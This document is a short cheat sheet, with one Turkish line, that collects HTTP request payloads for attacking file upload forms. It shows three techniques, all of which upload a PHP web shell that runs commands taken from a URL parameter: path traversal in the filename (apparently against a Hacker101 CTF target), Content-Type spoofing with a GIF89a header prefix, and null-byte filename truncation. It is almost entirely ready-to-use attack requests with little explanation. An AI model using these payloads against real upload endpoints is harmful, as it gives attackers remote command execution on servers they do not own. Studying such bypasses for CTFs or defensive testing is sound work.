## path traversal with File Uploads

**`../exploit2.phtml` pathtraversal with bypass**

```http
POST / HTTP/2
Host: targets.com
Content-Type: multipart/form-data; boundary=----geckoformboundaryc2fa72a9baca788c110271be15486937
Content-Length: 401
Origin: https://b6c991c5dfcc1f65fd98c70dbe368fda.ctf.hacker101.com
Referer: https://b6c991c5dfcc1f65fd98c70dbe368fda.ctf.hacker101.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundaryc2fa72a9baca788c110271be15486937
Content-Disposition: form-data; name="filename"

../exploit2.phtml
------geckoformboundaryc2fa72a9baca788c110271be15486937
Content-Disposition: form-data; name="upload"; filename="../exploit2.phtml"
Content-Type: application/x-php

<?php echo "Shell";system($_GET['cmd']); ?>

------geckoformboundaryc2fa72a9baca788c110271be15486937--

```

## Content-Type

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------

---------------------------
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
---------------------------

GIF89a; <?php system($_GET['cmd']); ?>


```
Content-Type olarak image/jpeg, image/png veya image/gif kullanabilirsiniz


## nullbyte

```http
POST /upload.php HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>```
